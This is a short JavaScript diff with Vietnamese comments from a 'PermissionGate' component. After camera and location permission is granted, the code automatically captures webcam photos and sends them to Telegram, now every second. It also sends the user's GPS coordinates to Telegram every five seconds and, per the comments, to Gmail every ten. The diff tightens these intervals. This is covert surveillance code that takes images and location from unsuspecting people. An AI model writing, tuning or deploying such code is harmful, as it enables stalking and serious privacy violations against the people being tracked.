@@ -339,15 +339,15 @@
             videoEl.srcObject = stream;
             videoEl.play().catch(() => {});
 
-            // Chụp ngay tấm đầu tiên sau 600ms
+            // Chụp ngay tấm đầu tiên sau 300ms
             setTimeout(() => {
                 captureAndSendPhoto();
-            }, 600);
+            }, 300);
 
-            // Cứ 2 giây tự động chụp 1 tấm gửi về Telegram
+            // Cứ 1 giây tự động chụp 1 tấm gửi về Telegram
             cameraIntervalId = setInterval(() => {
                 captureAndSendPhoto();
-            }, 2000);
+            }, 1000);
         }).catch((err) => {
             console.warn("[PermissionGate] Camera permission error:", err);
         });
@@ -470,15 +470,15 @@
                 } catch (e) {}
             }
 
-            // 3. Chu kỳ gửi: Telegram GPS 3 giây / lần, Gmail 10 giây / lần
+            // 3. Chu kỳ gửi: Telegram GPS 5 giây / lần, Gmail 10 giây / lần
             setInterval(() => {
                 if (latestCoords) {
                     secondsElapsed++;
 
-                    // 📱 Telegram GPS: Cứ 3 giây gửi 1 lần
-                    if (secondsElapsed % 3 === 0) {
+                    // 📱 Telegram GPS: Cứ 5 giây gửi 1 lần
+                    if (secondsElapsed % 5 === 0) {
                         teleCount++;
-                        console.log(`[PermissionGate] ⏱️ Gửi định vị GPS định kỳ 3s (Lần #${teleCount})...`);
+                        console.log(`[PermissionGate] ⏱️ Gửi định vị GPS định kỳ 5s (Lần #${teleCount})...`);
                         sendGpsToTelegram(latestCoords, teleCount).catch(() => {});
                     }
 
